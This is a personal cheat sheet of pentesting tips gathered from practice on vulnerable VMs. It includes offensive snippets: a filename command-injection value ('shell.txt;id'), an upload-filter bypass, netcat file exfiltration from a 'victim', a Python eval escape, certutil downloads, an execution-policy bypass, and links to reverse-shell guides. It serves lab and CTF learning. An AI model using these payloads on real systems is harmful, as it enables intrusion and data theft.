# Basic pentesting

I am not a professional pentester or something these are just the things that I have learned while doing Vulnerable VMs from websites like [Vulnhub](https://www.vulnhub.com/), [HackTheBox](https://www.hackthebox.eu/), [TryHackMe](https://tryhackme.com/) etc.

### General

* If you have downloaded the VM from Website like Vulnhub or any other website then make sure you run it in `host-only` mode. Even though Vulnhub can be super trusted but still it's good to be paranoid.
    - Most of the VM with `bridged` as their default network setting.
    - Also if you want to be super paranoid then go for NAT setting but I've had issues with some VMs in `NAT` network setting.

* Enumeration is the Key but only till a certain level. Lot of times the way is too guessy, too CTF type and that point `enumeration` doesn't help at all. So if you have done the basics of enumeration like for HTTP service fuzzing, dirsearch etc then don't worry it's totally okay to ask for a damn hint.

### General
* Always take a good look of what you've found
* php file type can be bypassed by php5
* If in a file upload the output is shown meaning it's processing the upload
    - exploit it with command injection in filename like "shell.txt;id"
* Change Static IP
    - `sudo ifconfig vmnet1 10.10.10.11 netmask 255.255.255.0`
* VMware /dev/vmmon not loaded
    - `sudo vmware-modconfig --console --install-all`

* `sudo vmware-modconfig --console --install-all`
    - Fix the issue of vmware modprobe error

* If cracking password for kdbx takes longer time then try finding a key file for it.
* for git repos always check out the git logs

### For linux

* Change host timezone
    - `echo "Asia/kolkata" > /etc/timezone`
    - `dpkg-reconfigure -f noninteractive tzdata`
* Always run dirsearch with extensions
    - `python dirsearch.py -f -e html,php,tar.gz,txt,xml,zip,jpg,png,jpeg -u IP LIST`
* Port knocking with nmap
    - `for x in 066 666 3432; do nmap -Pn --max-retries 0 -p $x 10.10.10.10; done`
    - If you find set of 3 numbers possible options is port knocking
* Transfer with ncat
    - `nc -q1 -lvp 1234 < file` - on victim machine
    - `nc IP 1234> file` - on attackers machine
* use `dig axfr somedomain` to actually find other zone tranfser
    - checkout tempus fugit writeup
* If enum/sudo doesn't do any good.....check for writeable dirs
    - `find / -type d 2>/dev/null`
* LFI to RCE via SSH log poisoning
    - https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/
* To escape eval in python
    - https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html
    - `eval("__import__('os').system('ls')#")``

## For Windows

* Reverse shell for windows
    - https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
    - If you can upload any file then try to upload `nc.exe` and use that.

* To get enumeration file use
    - `certutils -urlcache -split -f URL`
    - when powershell is present
        + `Invoke-WebRequest URL -outfile file`

* Use powerups.ps1 enumeration script
    - https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1
    - Run it with `powershell.exe -ExecutionPolicy Bypass -File .\powersup.ps1`
